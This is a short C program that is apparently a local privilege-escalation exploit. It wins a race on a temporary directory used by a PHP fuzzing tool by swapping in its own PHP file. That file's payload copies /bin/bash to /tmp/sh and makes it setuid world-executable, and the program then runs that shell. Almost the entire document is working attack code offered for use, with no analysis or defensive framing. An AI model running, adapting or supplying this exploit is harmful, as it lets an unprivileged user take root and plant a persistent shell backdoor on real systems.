#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/inotify.h>
#define FILEA "/tmp/PFF/fuzz0.php"
#define FILEB "/tmp/fuzzlol.php"
#define MODEZ (S_IRWXU | S_IRWXG | S_IRWXO)


int main(int argc, char *argv[])
{
    int f,n,w;
    char *s = "<? system(\"cp /bin/bash /tmp/sh; chmod 4777 /tmp/sh\"); ?>";
    struct inotify_event e;
    n = inotify_init();
    printf("-=*************-\n");
    if ((f = open(FILEB, O_CREAT | O_RDWR| O_EXCL, MODEZ)) > 0){
        write(f, s, strlen(s));
        close(f);
    }
    printf("[+] created abritrary code: %s\n",  FILEB);
    w = inotify_add_watch(n, "/tmp/PFF", IN_CREATE);
    read(n, &e, sizeof(e));
    rename(FILEB, FILEA);
    printf("[+] %s => %s\n", FILEB, FILEA);
        printf("[+] executing arbitrary code\n");
    sleep(2);
    printf("[+] racism complete \n");
    execl("/tmp/sh", "/tmp/sh", 0);

}

